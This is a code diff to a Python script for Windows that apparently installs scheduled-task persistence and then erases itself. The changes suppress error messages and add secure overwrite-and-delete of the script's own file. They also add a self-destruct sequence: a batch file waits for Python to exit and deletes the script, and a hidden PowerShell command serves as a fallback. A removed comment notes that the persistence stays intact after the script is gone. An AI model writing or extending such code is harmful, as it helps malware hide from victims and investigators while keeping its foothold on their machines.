@@ -244,7 +244,8 @@ def setup_auto_scheduler(exe_path, username):
                 # print(f"⚠️  Task registration failed: {result.stderr}")
                 print("..")
         except Exception as e:
-            print(f"⚠️  Task registration error: {e}")
+            # print(f"⚠️  Task registration error: {e}")
+            print("..")
         
         # Create batch installer as fallback
         batch_content = f'''@echo off
@@ -325,23 +326,46 @@ def secure_delete_file(file_path):
     """Securely delete file by overwriting and removing"""
     try:
         if not os.path.exists(file_path):
+            # print(f"ℹ️  File doesn't exist: {file_path}")
             return True
+        # 
+        # print(f"🗑️  Attempting to delete: {file_path}")
         
         # Get file size
         file_size = os.path.getsize(file_path)
+        print(f"red pants")
         
-        # Overwrite with random data multiple times
-        with open(file_path, "r+b") as f:
-            for _ in range(3):  # 3 passes
-                f.seek(0)
-                f.write(os.urandom(file_size))
-                f.flush()
-                os.fsync(f.fileno())  # Force write to disk
+        # Try simple deletion first
+        try:
+            os.remove(file_path)
+            # print(f"✅ Simple deletion successful")
+            return True
+        except PermissionError:
+            # print(f"⚠️  Permission denied, trying overwrite method")
+            print("..")
+        except Exception as e:
+            # print(f"⚠️  Simple deletion failed: {e}")
+            print("..")
         
-        # Finally delete the file
-        os.remove(file_path)
-        # print(f"🗑️  Securely deleted: {file_path}")
-        return True
+        # If simple deletion fails, try overwrite method
+        try:
+            # Overwrite with random data multiple times
+            with open(file_path, "r+b") as f:
+                for i in range(3):  # 3 passes
+                    # print(f"🔄 Overwrite pass {i+1}/3")
+                    f.seek(0)
+                    f.write(os.urandom(file_size))
+                    f.flush()
+                    os.fsync(f.fileno())  # Force write to disk
+            
+            # Finally delete the file
+            os.remove(file_path)
+            # print(f"✅ Secure deletion successful")
+            return True
+            
+        except Exception as e:
+            # print(f"❌ Secure deletion failed: {e}")
+            return False
         
     except Exception as e:
         # print(f"❌ Failed to delete {file_path}: {e}")
@@ -352,41 +376,81 @@ def self_destruct():
     # print("💀 Initiating self-destruction of script...")
     
     script_path = os.path.abspath(__file__)
+    # print(f"🎯 Target file: {script_path}")
     
-    # Create a batch file to delete this script after it exits
+    # Method 1: Try immediate secure deletion
+    if secure_delete_file(script_path):
+        # print("✅ Script deleted successfully!")
+        return
+    
+    # Method 2: Create a more robust batch file
     batch_content = f'''@echo off
-echo Cleaning up script...
-timeout /t 2 /nobreak >nul
-del /f /q "{script_path}"
+setlocal
+echo Waiting for Python to exit...
+:WAIT
+tasklist /FI "IMAGENAME eq python.exe" 2>NUL | find /I /N "python.exe">NUL
+if "%ERRORLEVEL%"=="0" (
+    timeout /t 1 /nobreak >nul
+    goto WAIT
+)
+echo Deleting script...
+if exist "{script_path}" (
+    del /f /q "{script_path}"
+    echo Script deleted: {script_path}
+) else (
+    echo Script not found: {script_path}
+)
+echo Cleaning up batch file...
 del /f /q "%~f0"
-echo Script deleted successfully.
 '''
     
-    batch_path = os.path.join(tempfile.gettempdir(), f"cleanup_{random.randint(1000, 9999)}.bat")
+    batch_path = os.path.join(os.path.dirname(script_path), f"cleanup_{random.randint(1000, 9999)}.bat")
     
     try:
         with open(batch_path, 'w') as f:
             f.write(batch_content)
         
-        # print(f"✅ Self-destruction sequence initiated")
-        # print(f"💥 Script will be deleted in 2 seconds...")
-        # print(f"ℹ️  All persistence (tasks & executables) remain intact")
+        # print(f"📄 Cleanup batch created: {batch_path}")
         
-        # Execute the batch file in background
+        # Execute the batch file
         subprocess.Popen(
             [batch_path],
-            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            cwd=os.path.dirname(script_path)
         )
         
-        time.sleep(1)
+        # print("🚀 Self-destruction sequence started")
+        # print("💥 Exiting Python to allow deletion...")
+        
+        # Force exit to release file handle
+        os._exit(0)
         
     except Exception as e:
-        # print(f"❌ Self-destruction failed: {e}")
-        # Manual deletion attempt
+        # print(f"❌ Batch method failed: {e}")
+        
+        # Method 3: Try PowerShell as last resort
         try:
-            secure_delete_file(script_path)
-        except:
-            print("....")
+            ps_command = f'''
+Start-Sleep -Seconds 2
+if (Test-Path "{script_path}") {{
+    Remove-Item "{script_path}" -Force
+    Write-Host "Script deleted successfully"
+}} else {{
+    Write-Host "Script not found"
+}}
+'''
+            
+            subprocess.Popen([
+                'powershell', '-WindowStyle', 'Hidden', '-Command', ps_command
+            ])
+            
+            # print("🔄 PowerShell deletion method initiated")
+            os._exit(0)
+            
+        except Exception as ps_e:
+            # print(f"❌ PowerShell method failed: {ps_e}")
+            # print("⚠️  Manual deletion required")
+            print("..")
 
 def main():
     """Main extraction and execution routine with auto scheduler"""
